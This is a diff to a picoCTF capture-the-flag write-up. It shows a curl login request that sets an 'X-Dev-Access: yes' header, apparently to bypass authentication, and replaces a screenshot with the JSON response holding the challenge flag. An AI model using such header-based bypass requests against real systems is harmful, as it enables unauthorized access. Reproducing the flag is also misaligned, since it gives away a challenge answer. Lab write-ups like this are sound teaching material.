@@ -19,7 +19,7 @@ In this case, I use Curl
 `curl -X POST http://amiable-citadel.picoctf.net:YourPost/login -H "Content-Type: application/json" -H "X-Dev-Access: yes" -d '{"email":"ctf-player@picoctf.org","password":"123"}'`  
 
 Flag will be returned  
-<img width="400" height="250" alt="image" src="https://github.com/user-attachments/assets/6966bc00-cdc5-41a1-9ccc-1966a313f381" />
+`{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_cbb8faa7}"}`
 
 
 
